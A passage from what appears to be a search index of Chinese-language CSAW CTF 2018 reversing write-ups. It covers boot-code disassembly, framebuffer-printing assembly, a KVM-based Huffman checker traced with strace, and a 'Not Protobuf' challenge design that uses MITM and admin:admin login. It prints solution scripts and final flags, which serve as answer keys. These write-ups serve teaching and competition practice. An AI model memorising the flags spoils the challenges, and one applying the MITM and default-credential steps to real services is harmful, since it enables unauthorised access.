ss , ax 0000 : 600 b bc0160 mov sp , 0x6001 0000 : 600 e 8 ed8 mov ds , ax 0000 : 6010 8 ec0 mov es , ax 0000 : 6012 8 ee0 mov fs , ax 0000 : 6014 8 ee8 mov gs , ax 0000 : 6016 fc cld 0000 : 6017 66 bf00000000 mov edi , 0 \u250c\u2500 < 0000 : 601 d eb07 jmp 0x6026 \u2502 0000 : 601f 90 nop \u2502 0000 : 6020 0000 add byte [ bx + si ], al \u2502 0000 : 6022 0000 add byte [ bx + si ], al \u2502 0000 : 6024 0000 add byte [ bx + si ], al \u2514\u2500 > 0000 : 6026 57 push di 0000 : 6027 66 b900100000 mov ecx , 0x1000 0000 : 602 d 6631 c0 xor eax , eax 0000 : 6030 fc cld 0000 : 6031 f366ab rep stosd dword es :[ di ], eax 0000 : 6034 5f pop di 0000 : 6035 26668 d850010 lea eax , dword es :[ di + 0x1000 ] 0000 : 603 b 6683 c803 or eax , 3 0000 : 603f 26668905 mov dword es :[ di ], eax 0000 : 6043 26668 d850020 lea eax , dword es :[ di + 0x2000 ] 0000 : 6049 6683 c803 or eax , 3 0000 : 604 d 266689850010 mov dword es :[ di + 0x1000 ], eax ; [ 0x1000 : 4 ] =- 1 0000 : 6053 26668 d850030 lea eax , dword es :[ di + 0x3000 ] 0000 : 6059 6683 c803 or eax , 3 0000 : 605 d 266689850020 mov dword es :[ di + 0x2000 ], eax ; [ 0x2000 : 4 ] =- 1 0000 : 6063 57 push di 0000 : 6064 8 dbd0030 lea di , word [ di + 0x3000 ] 0000 : 6068 66 b803000000 mov eax , 3 \u250c\u2500 > 0000 : 606 e 26668905 mov dword es :[ di ], eax \u254e 0000 : 6072 660500100000 add eax , 0x1000 \u254e 0000 : 6078 83 c708 add di , 8 \u254e 0000 : 607 b 663 d00002000 cmp eax , 0x200000 \u2514\u2500 < 0000 : 6081 72 eb jb 0x606e 0000 : 6083 5f pop di 0000 : 6084 b0ff mov al , 0xff ; 255 0000 : 6086 e6a1 out 0xa1 , al 0000 : 6088 e621 out 0x21 , al ; '!' 0000 : 608 a 90 nop 0000 : 608 b 90 nop 0000 : 608 c 0f011e2060 lidt [ 0x6020 ] 0000 : 6091 66 b8a0000000 mov eax , 0xa0 ; 160 0000 : 6097 0f22e0 mov cr4 , eax 0000 : 609 a 6689f a mov edx , edi 0000 : 609 d 0f 22 da mov cr3 , edx 0000 : 60 a0 66 b9800000c0 mov ecx , 0xc0000080 0000 : 60 a6 0f 32 rdmsr 0000 : 60 a8 660 d00010000 or eax , 0x100 0000 : 60 ae 0f 30 wrmsr 0000 : 60 b0 0f 20 c3 mov ebx , cr0 0000 : 60 b3 6681 cb010000 . or ebx , 0x80000001 0000 : 60 ba 0f 22 c3 mov cr0 , ebx 0000 : 60 bd 0f0116e260 lgdt [ 0x60e2 ] \u250c\u2500 < 0000 : 60 c2 ea58610800 ljmp 8 : 0x6158 \u5c06hlt\u6539\u4e3anop\u8df3\u8fc7\u3002\u52300x6158 [ 0000 : 6000 ] > s 0x6158 [ 0000 : 6158 ] > e asm . bits = 64 [ 0x00006158 ] > pd 37 0x00006158 66 b81000 mov ax , 0x10 ; 16 0x0000615c 8 ed8 mov ds , eax 0x0000615e 8 ec0 mov es , eax 0x00006160 8 ee0 mov fs , eax 0x00006162 8 ee8 mov gs , eax 0x00006164 8 ed0 mov ss , eax 0x00006166 bf00800b00 mov edi , 0xb8000 0x0000616b b9f4010000 mov ecx , 0x1f4 ; 500 0x00006170 48 b8201f201f . movabs rax , 0x1f201f201f201f20 0x0000617a f348ab rep stosq qword [ rdi ], rax 0x0000617d bf00800b00 mov edi , 0xb8000 0x00006182 4831 c0 xor rax , rax 0x00006185 4831 db xor rbx , rbx 0x00006188 4831 c9 xor rcx , rcx 0x0000618b 4831 d2 xor rdx , rdx 0x0000618e b245 mov dl , 0x45 ; 'E' ; 69 0x00006190 80 ca6c or dl , 0x6c ; 'l' 0x00006193 b679 mov dh , 0x79 ; 'y' ; 121 0x00006195 80 ce6b or dh , 0x6b ; 'k' 0x00006198 20f 2 and dl , dh 0x0000619a b600 mov dh , 0 0x0000619c 48 bee8600000 . movabs rsi , 0x60e8 \u250c\u2500 > 0x000061a6 48833 c0600 cmp qword [ rsi + rax ], 0 \u250c\u2500\u2500 < 0x000061ab 7427 je 0x61d4 \u2502\u254e 0x000061ad b904000000 mov ecx , 4 \u250c\u2500\u2500\u2500 > 0x000061b2 8 a1c06 mov bl , byte [ rsi + rax ] \u254e\u2502\u254e 0x000061b5 30 d3 xor bl , dl \u254e\u2502\u254e 0x000061b7 d0eb shr bl , 1 \u254e\u2502\u254e 0x000061b9 881 c06 mov byte [ rsi + rax ], bl \u254e\u2502\u254e 0x000061bc 4883 c002 add rax , 2 \u2514\u2500\u2500\u2500 < 0x000061c0 e2f0 loop 0x61b2 \u2502\u254e 0x000061c2 4883e808 sub rax , 8 \u2502\u254e 0x000061c6 488 b0c06 mov rcx , qword [ rsi + rax ] \u2502\u254e 0x000061ca 48890 c07 mov qword [ rdi + rax ], rcx \u2502\u254e 0x000061ce 4883 c008 add rax , 8 \u2502\u2514\u2500 < 0x000061d2 ebd2 jmp 0x61a6 \u2514\u2500\u2500 > 0x000061d4 ebd2 invalid \u5728\u6808\u4e0a\u89e3\u5bc6buf\u5e76\u4e14\u6253\u5370\uff0c\u89e3\u5bc6\u7b97\u6cd5\u5982\u4e0b import binascii enc = binascii . unhexlify ( \"a5b1aba79f09b5a3d78fb3010b0bd7fdf3c9d7a5b78dd7991905d7b7b50fd7b3018f8f0b85a3d70ba3ab89d701d7db09c393\" ) print ( \"\" . join ( chr (( b ^ 0x69 ) >> 1 ) for b in enc ))","title":"A-Walk-Through-x86-Part-2"},{"location":"CSAW-CTF-2018-Quals/rev/A-Walk-Through-x86-Part-3/","text":"Give them: \"part-3-server.py\", \"Makefile\", \"tacOS.bin\" Flag is in 'flag.txt' Description: The final boss! Time to pull together your knowledge of Bash, Python, and stupidly-low-level assembly!! This time you have to write some assembly that we're going to run.. You'll see the output of your code through VNC for 60 seconds. Objective: Print the flag. What to know: Strings need to be alternating between the character you want to print and '0x1f'. To print a string you need to write those alternating bytes to the frame buffer (starting at 0x00b8000...just do it). Increment your pointer to move through this buffer. If you're having difficulty figuring out where the flag is stored in memory, this code snippet might help you out: get_ip: call next_line next_line: pop rax ret That'll put the address of pop rax into rax. Call serves as an alias for push rip (the instruction pointer - where we are in code) followed by jmp _____ where whatever is next to the call fills in the blank. And in case this comes up, you shouldn't need to know where you are loaded in memory if you use that above snippet... Happy Reversing!! Elyk","title":"Home"},{"location":"CSAW-CTF-2018-Quals/rev/A-Walk-Through-x86-Part-3/writeup/","text":"\u901a\u8fc7part-3-server.py\u6211\u4eec\u53ef\u4ee5\u77e5\u9053\u6211\u4eec\u8981\u53d1\u9001\u7684\u662f\u6c47\u7f16\u6307\u4ee4\u5bf9\u5e94\u768416\u8fdb\u5236\uff0c\u6211\u4eec\u76f4\u63a5\u5199\u6c47\u7f16\u53bb\u8bfb\u53d6flag\u5373\u53ef\u3002 call next next: pop rbp mov edi, 0xb8000 loop: mov rsi, byte [rbp] inc rbp call draw_byte jmp loop draw_byte: /* rdi: framebuffer */ /* rsi: byte */ /* == CLOBBERS == */ /* rsi, rbx, rax */ mov rbx, rsi shr rsi, 4 call draw_nibble mov rsi, rbx call draw_nibble ret draw_nibble: /* rdi: framebuffer */ /* rsi: nibble */ /* == CLOBBERS == */ /* rax */ mov rax, rsi and al, 0x0f cmp al, 0x09 ja is_char is_digit: add al, 0x30 jmp output is_char: add al, 0x41 - 0x0a output: mov ah, 0x1f mov word [rdi], ax add rdi, 2 ret \u8fd4\u56de\u4fe1\u606f\u4e2d\u5b58\u5728flag\u3002 import binascii print ( binascii . unhexlify ( \"666c61677b53346c31795f53653131535f7461634f5368656c6c5f633064335f62595f7448655f5365345f53683072657d\" ) . decode ()) flag{S4l1y_Se11S_tacOShell_c0d3_bY_tHe_Se4_Sh0re}","title":"A-Walk-Through-x86-Part-3"},{"location":"CSAW-CTF-2018-Quals/rev/kvm/writeup/","text":"ida\u6253\u5f00\u8be5\u7a0b\u5e8f\uff0c\u53ef\u4ee5\u770b\u5230\u6253\u5f00\u4e86\u4e00\u4e2a /dev/kvm \u7684\u8bbe\u5907\uff0c\u5e76\u901a\u8fc7ioctl\u4f20\u9012\u4fe1\u606f strace\u8ddf\u8e2a\u4e0bcall $ strace -v ./challenge openat(AT_FDCWD, \"/dev/kvm\", O_RDWR) = 3 ioctl(3, KVM_GET_API_VERSION, 0) = 12 ioctl(3, KVM_CREATE_VM, 0) = 4 ioctl(4, KVM_SET_TSS_ADDR, 0xfffbd000) = 0 mmap(NULL, 2097152, PROT_READ|PROT_WRITE, MAP_PRIVATE|MAP_ANONYMOUS|MAP_NORESERVE, -1, 0) = 0x7fd00ef77000 madvise(0x7fd00ef77000, 2097152, MADV_MERGEABLE) = 0 ioctl(4, KVM_SET_USER_MEMORY_REGION, {slot=0, flags=0, guest_phys_addr=0, memory_size=2097152, userspace_addr=0x7fd00ef77000}) = 0 ioctl(4, KVM_CREATE_VCPU, 0) = 5 ioctl(3, KVM_GET_VCPU_MMAP_SIZE, 0) = 12288 mmap(NULL, 12288, PROT_READ|PROT_WRITE, MAP_SHARED, 5, 0) = 0x7fd00f37a000 ioctl(5, KVM_GET_SREGS, {cs={base=0xffff0000, limit=65535, selector=61440, type=11, present=1, dpl=0, db=0, s=1, l=0, g=0, avl=0}, ds={base=0, limit=65535, selector=0, type=3, present=1, dpl=0, db=0, s=1, l=0, g=0, avl=0}, es={base=0, limit=65535, selector=0, type=3, present=1, dpl=0, db=0, s=1, l=0, g=0, avl=0}, fs={base=0, limit=65535, selector=0, type=3, present=1, dpl=0, db=0, s=1, l=0, g=0, avl=0}, gs={base=0, limit=65535, selector=0, type=3, present=1, dpl=0, db=0, s=1, l=0, g=0, avl=0}, ss={base=0, limit=65535, selector=0, type=3, present=1, dpl=0, db=0, s=1, l=0, g=0, avl=0}, tr={base=0, limit=65535, selector=0, type=11, present=1, dpl=0, db=0, s=0, l=0, g=0, avl=0}, ldt={base=0, limit=65535, selector=0, type=2, present=1, dpl=0, db=0, s=0, l=0, g=0, avl=0}, gdt={base=0, limit=65535}, idt={base=0, limit=65535}, cr0=1610612752, cr2=0, cr3=0, cr4=0, cr8=0, efer=0, apic_base=0xfee00900, interrupt_bitmap=[0, 0, 0, 0]}) = 0 ioctl(5, KVM_SET_SREGS, {cs={base=0, limit=4294967295, selector=8, type=11, present=1, dpl=0, db=0, s=1, l=1, g=1, avl=0}, ds={base=0, limit=4294967295, selector=16, type=3, present=1, dpl=0, db=0, s=1, l=1, g=1, avl=0}, es={base=0, limit=4294967295, selector=16, type=3, present=1, dpl=0, db=0, s=1, l=1, g=1, avl=0}, fs={base=0, limit=4294967295, selector=16, type=3, present=1, dpl=0, db=0, s=1, l=1, g=1, avl=0}, gs={base=0, limit=4294967295, selector=16, type=3, present=1, dpl=0, db=0, s=1, l=1, g=1, avl=0}, ss={base=0, limit=4294967295, selector=16, type=3, present=1, dpl=0, db=0, s=1, l=1, g=1, avl=0}, tr={base=0, limit=65535, selector=0, type=11, present=1, dpl=0, db=0, s=0, l=0, g=0, avl=0}, ldt={base=0, limit=65535, selector=0, type=2, present=1, dpl=0, db=0, s=0, l=0, g=0, avl=0}, gdt={base=0, limit=65535}, idt={base=0, limit=65535}, cr0=2147811379, cr2=0, cr3=8192, cr4=32, cr8=0, efer=1280, apic_base=0xfee00900, interrupt_bitmap=[0, 0, 0, 0]}) = 0 ioctl(5, KVM_SET_REGS, {rax=0, rbx=0, rcx=0, rdx=0, rsi=0, rdi=0, rsp=0x200000, rbp=0, r8=0, r9=0, r10=0, r11=0, r12=0, r13=0, r14=0, r15=0, rip=0, rflags=0x2}) = 0 ioctl(5, KVM_RUN, 0) = 0 fstat(0, {st_dev=makedev(0, 26), st_ino=4, st_mode=S_IFCHR|0620, st_nlink=1, st_uid=1000, st_gid=5, st_blksize=1024, st_blocks=0, st_rdev=makedev(136, 1), st_atime=1537036280 /* 2018-09-16T02:31:20.548336166+0800 */, st_atime_nsec=548336166, st_mtime=1537036280 /* 2018-09-16T02:31:20.548336166+0800 */, st_mtime_nsec=548336166, st_ctime=1537021307 /* 2018-09-15T22:21:47.548336166+0800 */, st_ctime_nsec=548336166}) = 0 brk(NULL) = 0x55d7d8728000 brk(0x55d7d8749000) = 0x55d7d8749000 read(0 \u53c2\u8003 kvm api openat(AT_FDCWD, \"/dev/kvm\", O_RDWR) = 3 \u6253\u5f00\u53e5\u67c4 ioctl(3, KVM_GET_API_VERSION, 0) = 12 \u68c0\u67e5kvm api\u7684\u7248\u672c ioctl(3, KVM_CREATE_VM, 0) = 4 \u521b\u5efa\u4e00\u4e2avm\uff0cfd\u4e3a4 mmap(NULL, 2097152, PROT_READ|PROT_WRITE, MAP_PRIVATE|MAP_ANONYMOUS|MAP_NORESERVE, -1, 0) = 0x7f1cebda8000 madvise(0x7f1cebda8000, 2097152, MADV_MERGEABLE) = 0 ioctl(4, KVM_SET_USER_MEMORY_REGION, {slot=0, flags=0, guest_phys_addr=0, memory_size=2097152, userspace_addr=0x7f1cebda8000}) = 0 \u7ed9vm\u5206\u914d\u5185\u5b58\u7a7a\u95f4 ioctl(4, KVM_CREATE_VCPU, 0) = 5 \u521b\u5efavcpu ioctl(3, KVM_GET_VCPU_MMAP_SIZE, 0) = 12288 mmap(NULL, 12288, PROT_READ|PROT_WRITE, MAP_SHARED, 5, 0) = 0x7f1cec1ab000 \u521b\u5efavcpu\u9700\u8981\u7684\u5185\u5b58\u7a7a\u95f4 ioctl(5, KVM_SET_SREGS, {cs={base=0, limit=4294967295, selector=8, type=11, present=1, dpl=0, db=0, s=1, l=1, g=1, avl=0}, ds={base=0, limit=4294967295, selector=16, type=3, present=1, dpl=0, db=0, s=1, l=1, g=1, avl=0}, es={base=0, limit=4294967295, selector=16, type=3, present=1, dpl=0, db=0, s=1, l=1, g=1, avl=0}, fs={base=0, limit=4294967295, selector=16, type=3, present=1, dpl=0, db=0, s=1, l=1, g=1, avl=0}, gs={base=0, limit=4294967295, selector=16, type=3, present=1, dpl=0, db=0, s=1, l=1, g=1, avl=0}, ss={base=0, limit=4294967295, selector=16, type=3, present=1, dpl=0, db=0, s=1, l=1, g=1, avl=0}, tr={base=0, limit=65535, selector=0, type=11, present=1, dpl=0, db=0, s=0, l=0, g=0, avl=0}, ldt={base=0, limit=65535, selector=0, type=2, present=1, dpl=0, db=0, s=0, l=0, g=0, avl=0}, gdt={base=0, limit=65535}, idt={base=0, limit=65535}, cr0=2147811379, cr2=0, cr3=8192, cr4=32, cr8=0, efer=1280, apic_base=0xfee00900, interrupt_bitmap=[0, 0, 0, 0]}) = 0 ioctl(5, KVM_SET_REGS, {rax=0, rbx=0, rcx=0, rdx=0, rsi=0, rdi=0, rsp=0x200000, rbp=0, r8=0, r9=0, r10=0, r11=0, r12=0, r13=0, r14=0, r15=0, rip=0, rflags=0x2}) = 0 \u521d\u59cb\u5316\u5bc4\u5b58\u5668\u548ccontext\u8fdb\u7a0b\u4e0a\u4e0b\u6587\u7684\u5185\u5bb9 ioctl(5, KVM_RUN, 0) = 0 \u8dd1kvm\u4e86\uff0cvm\u8d77\u6765\u4e4b\u540e\u7a0b\u5e8f\u4f1a\u63a5\u53d7\u8f93\u5165\uff0c\u5e76\u4e14\u6bcf\u6b21\u6267\u884c\u4e0b ioctl(5, KVM_RUN, 0) \u7528frace\u53bb\u8ddf\u8e2akvm # echo 1 > /sys/kernel/debug/tracing/events/kvm/enable # cat /sys/kernel/debug/tracing/trace_pipe challenge-24797 [003] .... 83184.290314: kvm_fpu: load challenge-24797 [003] .... 83184.290322: kvm_pio: pio_read at 0xe9 size 1 count 1 val 0x31 challenge-24797 [003] d..1 83184.290326: kvm_entry: vcpu 0 challenge-24797 [003] .... 83184.290332: kvm_exit: reason EXTERNAL_INTERRUPT rip 0x100 info 0 800000f6 challenge-24797 [003] d..1 83184.290334: kvm_entry: vcpu 0 challenge-24797 [003] .... 83184.290337: kvm_exit: reason IO_INSTRUCTION rip 0xff info e90008 0 challenge-24797 [003] .... 83184.290339: kvm_fpu: unload challenge-24797 [003] .... 83184.290341: kvm_userspace_exit: reason KVM_EXIT_IO (2) challenge-24797 [003] .... 83184.290380: kvm_fpu: load challenge-24797 [003] .... 83184.290381: kvm_pio: pio_read at 0xe9 size 1 count 1 val 0x32 challenge-24797 [003] d..1 83184.290382: kvm_entry: vcpu 0 challenge-24797 [003] .... 83184.290384: kvm_exit: reason IO_INSTRUCTION rip 0xff info e90008 0 challenge-24797 [003] .... 83184.290385: kvm_fpu: unload challenge-24797 [003] .... 83184.290386: kvm_userspace_exit: reason KVM_EXIT_IO (2) challenge-24797 [003] .... 83184.290413: kvm_fpu: load challenge-24797 [003] .... 83184.290413: kvm_pio: pio_read at 0xe9 size 1 count 1 val 0x33 challenge-24797 [003] d..1 83184.290414: kvm_entry: vcpu 0 challenge-24797 [003] .... 83184.290416: kvm_exit KVM \u8c03\u7528 pio_read() \u63a5\u6536\u8f93\u5165 \u770bcs\u521d\u59cb\u5316\u7684\u5185\u5bb9\uff0c\u6211\u4eec\u53ef\u4ee5\u77e5\u9053kvm\u662f\u4ece\u5730\u57400\u5f00\u59cb\u6267\u884c\u7684\u3002 \u901a\u8fc7ltrace\u8ddf\u8e2a\u53ef\u4ee5\u770b\u5230 \u6709\u90e8\u5206\u5185\u5bb9\u88ab\u62f7\u8d1d\u5230kvm\u76840\u5730\u5740\u3002 $ ltrace ./challenge memcpy(0x7f3f247a9000, \"UH\\211\\345H\\201\\354\\020(\\0\\0H\\215\\205\\360\\327\\377\\377\\276\\0(\\0\\0H\\211\\307\\350\\262\\0\\0\\0\\307\"..., 4888) = 0x7f3f247a9000 \u957f\u5ea6\u4e3a 4888 \u63d0\u53d6\u8fd9\u90e8\u5206\u4e8c\u8fdb\u5236\uff0c\u53cd\u7f16\u8bd1\u770b\u4e0b \u901a\u8fc7\u5206\u6790\u53ef\u4ee5\u770b\u5230\u57280x1e0\u4e2d\u8fdb\u884c\u4e86check vm\u4f1a\u5f88\u5feb\u9000\u51fa\uff0c\u7136\u540e\u7a0b\u5e8f\u4f1a\u4fee\u6539\u5b83\u7684rip\u7136\u540e\u91cd\u65b0\u542f\u52a8 strace\u8ddf\u8e2a\u770b\u4e0b $ strace -vo log ./challenge < input $ less log ... ioctl(5, KVM_RUN, 0) = 0 ioctl(5, KVM_GET_REGS, {rax=0x3493310d, rbx=0, rcx=0x1fffe7, rdx=0xe9, rsi=0x1300, rdi=0xffffffff, rsp=0x1fd778, rbp=0x1fd7d8, r8=0, r9=0, r10=0, r11=0, r12=0, r13=0, r14=0, r15=0, rip=0x202, rflags=0x6}) = 0 ioctl(5, KVM_SET_REGS, {rax=0x3493310d, rbx=0, rcx=0x1fffe7, rdx=0xe9, rsi=0x1300, rdi=0xffffffff, rsp=0x1fd778, rbp=0x1fd7d8, r8=0, r9=0, r10=0, r11=0, r12=0, r13=0, r14=0, r15=0, rip=0x32c, rflags=0x6}) = 0 ioctl(5, KVM_RUN, 0) = 0 ioctl(5, KVM_GET_REGS, {rax=0x5de72dd, rbx=0, rcx=0x5de72dd, rdx=0xffffffff, rsi=0x1300, rdi=0xffffffff, rsp=0x1fd778, rbp=0x1fd7d8, r8=0, r9=0, r10=0, r11=0, r12=0, r13=0, r14=0, r15=0, rip=0x342, rflags=0x46}) = 0 ioctl(5, KVM_SET_REGS, {rax=0x5de72dd, rbx=0, rcx=0x5de72dd, rdx=0xffffffff, rsi=0x1300, rdi=0xffffffff, rsp=0x1fd778, rbp=0x1fd7d8, r8=0, r9=0, r10=0, r11=0, r12=0, r13=0, r14=0, r15=0, rip=0x347, rflags=0x46}) = 0 ioctl(5, KVM_RUN, 0) = 0 ... ioctl(5, KVM_GET_REGS, {rax=0x968630d0, rbx=0, rcx=0x5de72dd, rdx=0x30, rsi=0xae0, rdi=0x30, rsp=0x1fd628, rbp=0x1fd688, r8=0, r9=0, r10=0, r11=0, r12=0, r13=0, r14=0, r15=0, rip=0x342, rflags=0x13}) = 0 ioctl(5, KVM_SET_REGS, {rax=0x968630d0, rbx=0, rcx=0x5de72dd, rdx=0x30, rsi=0xae0, rdi=0x30, rsp=0x1fd628, rbp=0x1fd688, r8=0, r9=0, r10=0, r11=0, r12=0, r13=0, r14=0, r15=0, rip=0x400, rflags=0x13}) = 0 ioctl(5, KVM_RUN, 0) = 0 ioctl(5, KVM_GET_REGS, {rax=0xef5bdd13, rbx=0, rcx=0x8f6e2804, rdx=0xae0, rsi=0x30, rdi=0x61, rsp=0x1fd628, rbp=0x1fd688, r8=0, r9=0, r10=0, r11=0, r12=0, r13=0, r14=0, r15=0, rip=0x41d, rflags=0x97}) = 0 ioctl(5, KVM_SET_REGS, {rax=0xef5bdd13, rbx=0, rcx=0x8f6e2804, rdx=0xae0, rsi=0x30, rdi=0x61, rsp=0x1fd628, rbp=0x1fd688, r8=0, r9=0, r10=0, r11=0, r12=0, r13=0, r14=0, r15=0, rip=0x435, rflags=0x97}) = 0 ioctl(5, KVM_RUN, 0) = 0 ioctl(5, KVM_GET_REGS, {rax=0x5f291a64, rbx=0, rcx=0x8f6e2804, rdx=0xae0, rsi=0x30, rdi=0x61, rsp=0x1fd628, rbp=0x1fd688, r8=0, r9=0, r10=0, r11=0, r12=0, r13=0, r14=0, r15=0, rip=0x43b, rflags=0x97}) = 0 ioctl(5, KVM_SET_REGS, {rax=0x5f291a64, rbx=0, rcx=0x8f6e2804, rdx=0xae0, rsi=0x30, rdi=0x61, rsp=0x1fd628, rbp=0x1fd688, r8=0, r9=0, r10=0, r11=0, r12=0, r13=0, r14=0, r15=0, rip=0x441, rflags=0x97}) = 0 ioctl(5, KVM_RUN, 0) = 0 ioctl(5, KVM_GET_REGS, {rax=0xc50b6060, rbx=0, rcx=0x8f6e2804, rdx=0xae0, rsi=0x30, rdi=0x61, rsp=0x1fd628, rbp=0x1fd688, r8=0, r9=0, r10=0, r11=0, r12=0, r13=0, r14=0, r15=0, rip=0x44e, rflags=0x97}) = 0 ioctl(5, KVM_SET_REGS, {rax=0xc50b6060, rbx=0, rcx=0x8f6e2804, rdx=0xae0, rsi=0x30, rdi=0x61, rsp=0x1fd628, rbp=0x1fd688, r8=0, r9=0, r10=0, r11=0, r12=0, r13=0, r14=0, r15=0, rip=0x454, rflags=0x97}) = 0 ioctl(5, KVM_RUN, 0) = 0 \u7a0b\u5e8f\u4f1a\u6839\u636erax\u7684\u503c\u6765\u4fee\u6539rip,\u68c0\u6d4b\u7684\u6570\u7ec4\u4f4d\u4e8e0x2020A0 \u5bf9\u5e94\u5173\u7cfb\u5982\u4e0b\uff1a rax => rip 0x3493310d => 0x32c 0x5de72dd => 0x347 0x968630d0 => 0x400 0xef5bdd13 => 0x435 0x5f291a64 => 0x441 0xc50b6060 => 0x454 0x8aeef509 => 0x389 0x9d1fe433 => 0x3ed 0x54a15b03 => 0x376 0x8f6e2804 => 0x422 0x59c33d0f => 0x3e1 0x64d8a529 => 0x3b8 0x5de72dd => 0x347 0xfc2ff49f => 0x3ce patch\u6240\u6709\u7684halt\uff0c\u7136\u540eida\u770b\u4e0b void __noreturn main () { char a1 [ 10252 ]; // [rsp+0h] [rbp-2810h] unsigned int i ; // [rsp+280Ch] [rbp-4h] gets ( a1 , 10240 ); for ( i = 0 ; i <= 0x27FF ; ++ i ) { if ( ! generateBuf1 ( a1 [ i ], & rootNode ) ) { puts ( \"Wrong! \\n \" ); goto returnZero ; } } if ( ! bufs_unequal ( 0x54AuLL , buf1 , buf2 ) ) puts ( \"Correct! \\n \" ); returnZero : __halt (); JUMPOUT ( * ( _QWORD * ) j_returnZero ); } // return 1 if found int __fastcall generateBuf1 ( char charFromInput , tree_t * node ) { if ( SLOBYTE ( node -> value ) != - 1 ) // leaf return SLOBYTE ( node -> value ) == charFromInput ; if ( generateBuf1 ( charFromInput , node -> left ) == 1 ) { appendBit ( 0 ); return 1 ; } if ( generateBuf1 ( charFromInput , node -> right ) != 1 ) return 0 ; appendBit ( 1 ); return 1 ; } struct __attribute__ (( aligned ( 16 ))) tree_t { _QWORD value ; tree_t * left ; tree_t * right ; }; \u53ef\u4ee5\u770b\u5230\u662f\u6839\u636e\u6211\u4eec\u7684\u8f93\u5165\u53bb\u904d\u5386\u4e8c\u53c9\u6811\uff0c\u904d\u5386\u7684\u53f6\u5b50\u8282\u70b9\u53bb\u586b\u5145Buf,\u7136\u540e\u8fd9\u4e2aBuf\u8ddf\u6b63\u786e\u7684\u503c\u53bb\u6bd4\u8f83\u3002 \u7206\u7834\u884c\u4e0d\u901a\uff0c\u6700\u540e\u5c1d\u8bd5\u6839\u636e\u4e00\u4e9b\u5df2\u77e5\u7684\u5355\u8bcd\u624b\u52a8\u66ff\u6362\u4e8c\u8fdb\u5236\u5b57\u7b26\u4e32 flag.txtflag{who would win? 100 ctf teams o r 1 obfuscat3d boi?}0011101011111111 \u6700\u7ec8\u5f97\u5230 flag{who would win? 100 ctf teams or 1 obfuscat3d boi?} #!/usr/bin/env python3 table = { '0' : '000' , 'w' : '000100' , '}' : '0100100' , '5' : '1100100' , 'o' : '10100' , '1' : '01100' , 't' : '11100' , '3' : '000010' , '7' : '100010' , 'f' : '010010' , 'i' : '110010' , '?' : '0001010' , 'c' : '1001010' , 'b' : '0101010' , 'd' : '1101010' , 'g' : '0011010' , 'r' : '1011010' , ' \\n ' : '00111010' , '.' : '10111010' , '2' : '01111010' , 'e' : '11111010' , 'm' : '00000110' , 'n' : '10000110' , 'x' : '01000110' , '{' : '11000110' , 'a' : '100110' , 's' : '010110' , '6' : '110110' , '4' : '0001110' , 'h' : '1001110' , 'l' : '0101110' , 'u' : '1101110' , ' ' : '11110' , ' \\' : ' 1 ', } data = None flag = \"\" with open ( \"dump\" , \"rb\" ) as f : f . seek ( 0x580 ) data = f . read ( 0x54a ) data = data [: 146 ] binstr = \"\" for b in data : binstr += bin ( b )[ 2 :] . rjust ( 8 , '0' )[:: - 1 ] \"\"\" for i in range(2000): matched = [] for char, code in table.items(): if binstr.startswith(code): matched.append((code, char)) if len(matched) == 0: binstr = binstr[1:] continue code, char = min(matched, key=lambda t: t[0]) binstr = binstr.replace(code, '', 1) flag += char print(flag, binstr) \"\"\" def rep ( a , b ): s = \"\" for c in b : s += table [ c ] return a . replace ( s , b ) #print(binstr) binstr = rep ( binstr , \"flag.txt\" ) binstr = rep ( binstr , \"flag{\" ) binstr = rep ( binstr , \"would \" ) binstr = rep ( binstr , \"who \" ) binstr = rep ( binstr , \"or \" ) binstr = rep ( binstr , \"win? \" ) binstr = rep ( binstr , \"obfuscat3d \" ) binstr = rep ( binstr , \" ctf \" ) binstr = rep ( binstr , \"teams \" ) binstr = rep ( binstr , \"1 \" ) binstr = rep ( binstr , \"100\" ) binstr = rep ( binstr , \"boi?\" ) binstr = rep ( binstr , \"}\" ) print ( binstr )","title":"kvm"},{"location":"CSAW-CTF-2018-Quals/rev/notprotobuf/","text":"Not Protobuf \u00b6 Name: Not Protobuf Author: Lense Category: Forensics (also maybe RE) Points: 400 (maybe 500?) Description: I'm in this company's network and I've MITM'd this weird protocol between a dev client and server, but I can't figure out how it works. Connect to DEV CLIENT IP:51966 and I'll send the client traffic to you. Forward it on to the dev server at DEV SERVER IP:51966 to figure out what's going on. Once you're ready, hit up the prod server at PROD SERVER IP:51966 which should have a flag for you. Flag: flag{We don't make mistakes. We just have happy accidents} Overview \u00b6 Players man-in-the-middle a binary protocol between a client and server. They must reverse engineer the protocol without source and use that information to gather more data from the server. With that knowledge, they can request the flag from the production server. Components \u00b6 This needs 3 listening services. Everything is written in Python 3.7 (but should work in 3.6 too). Solve script: python3 solve.py PROD_SERVER_IP . Note: main solve script is not zero-knowledge. It uses the raw image that players can extract. Solve script with zero knowledge: python3 zksolve.py PROD_SERVER_IP . Dev client \u00b6 Dockerfile-dev_client Even though this is named client, it's actually a server too (sorry). Changes no resources and has no state between connections, so multiple instances can be spun up and load balanced if needed. Dev server \u00b6 Dockerfile-dev_server State is backed by a sqlite3 db. Multiple separate instances wouldn't change the challenge too much, but it would be confusing. Prod server \u00b6 Dockerfile-prod_server If you want to edit the flag, change it in this Dockerfile. State is backed by a sqlite3 db. Multiple separate instances wouldn't change the challenge too much. Dev client-server flow \u00b6 Players MITM and watch the dev client communicate with the server Client connects to server and initializes SSL Client logs in (from small list of creds) Client sets random pixels from image Client disconnects Solution \u00b6 Player logs in (using admin:admin) Player sends a special GetFlag message that the client never sends. Prod server checks that the client logged in and sends a location back Player resends flag request with the pixel data in image at that location Server validates the pixel and sends back the flag","title":"Not Protobuf"},{"location":"CSAW-CTF-2018-Quals/rev/notprotobuf/#not-protobuf","text":"Name: Not Protobuf Author: Lense Category: Forensics (also maybe RE) Points: 400 (maybe 500?) Description: I'm in this company's network and I've MITM'd this weird protocol between a dev client and server, but I can't figure out how it works. Connect to DEV CLIENT IP:51966 and I'll send the client traffic to you. Forward it on to the dev server at DEV SERVER IP:51966 to figure out what's going on. Once you're ready, hit up the prod server at PROD SERVER IP:51966 which should have a flag for you. Flag: flag{We don't make mistakes. We just have happy accidents}","title":"Not Protobuf"},{"location":"CSAW-CTF-2018-Quals/rev/notprotobuf/#overview","text":"Players man-in-the-middle a binary protocol between a client and server. They must reverse engineer the protocol without source and use that information to gather more data from the server. With that knowledge, they can request the flag from the production server.","title":"Overview"},{"location":"CSAW-CTF-2018-Quals/rev/notprotobuf/#components","text":"This needs 3 listening services. Everything is written in Python 3.7 (but should work in 3.6 too). Solve script: python3 solve.py PROD_SERVER_IP . Note: main solve script is not 